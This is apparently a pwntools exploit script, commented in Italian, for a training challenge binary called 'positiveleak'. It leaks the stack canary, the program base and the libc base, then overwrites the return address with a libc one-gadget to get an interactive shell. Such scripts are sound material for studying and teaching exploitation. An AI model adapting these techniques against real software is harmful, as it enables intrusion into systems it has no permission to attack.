from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

libc=ELF("./libc-2.35.so") 
context.log_level = 'debug'
if "REMOTE" not in args:
    p = process("./positiveleak")
    gdb.attach(p, """
        #b *0x00400c14
        
       """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 3003)


a=b"0"
b=b"2"
caso=b"8"
c=b"1000"
print=b"1"
d=b"10"

p.send(a)    #add numbers
time.sleep(0.1)
p.send(caso)    
time.sleep(0.1)
for i in range(7): #eseguo 3 volte
    p.send(print)
    time.sleep(0.1)

p.send(b"111111111111")
time.sleep(0.1)
p.send(b"1")
time.sleep(0.1)
#p.recvuntil(b"Exit")
#p.recvuntil(b"Exit")
#p.recvuntil(b"> ")
p.send(print)
p.recvuntil(b"1")
time.sleep(0.1)

for i in range(18): #22
    p.recvuntil(b"\n")
    

canary = p.recv(19) #15
log.debug(f'Il valore di canary è: {canary}')
int_representation = int(canary)
log.debug(f'Il valore di canary è: {int_representation}')
hex_representation = hex(int_representation)
log.debug(f'Il valore di canary è: {hex_representation}')

for i in range(2): 
    p.recvuntil(b"\n")

leaked_text=p.recv(14)
log.debug(f'Il valore di text è: {leaked_text}')
int_representation = int(leaked_text)
log.debug(f'Il valore di text è: {int_representation}')
hex_representation = hex(int_representation)
log.debug(f'Il valore di text è: {hex_representation}')
text_base=int_representation-0x14b2
log.debug(f'Il valore di text è: {hex(text_base)}')

for i in range(2): 
    p.recvuntil(b"\n")

leaked_libc=p.recv(15)
log.debug(f'Il valore di libc è: {leaked_libc}')
int_representation = int(leaked_libc)
log.debug(f'Il valore di libc è: {int_representation}')
hex_representation = hex(int_representation)
log.debug(f'Il valore di libc è: {hex_representation}')
libc_base=int_representation-0x1d90
log.debug(f'Il valore di libc è: {hex(libc_base)}')



pause()

p.send(b"0")
time.sleep(0.1)
p.send(b"40")
time.sleep(0.1)
for i in range(16):                      
    p.send(b"0")
    time.sleep(0.1)

p.send(str(libc_base+0x1f1470)) #22
time.sleep(0.1)

for i in range(6):
    p.send(b"0")
    time.sleep(0.1)


p.send(b"124311111111") #22
time.sleep(0.1)
p.send(str(text_base+0x152c))  #28   #libc_base+0xebdaf
time.sleep(0.1)

for i in range(4):
    p.send(b"0")
    time.sleep(0.1)

libcgadget=libc_base-0x28000  #proprio inizio di libc
p.send(str(libcgadget+0xebd52))
time.sleep(0.1)

for i in range(6):
    p.send(b"0")
    time.sleep(0.1)


p.send(b)

p.interactive()


# ROPgadget --binary positiveleak
# ropper --nocolor -f positiveleak > gadgets.txt
# b* 0x555555555386
# x/40gx  0x7fffffffdda0
# x/40gx 0x5555555580a0


#22 124311111111
#28  rip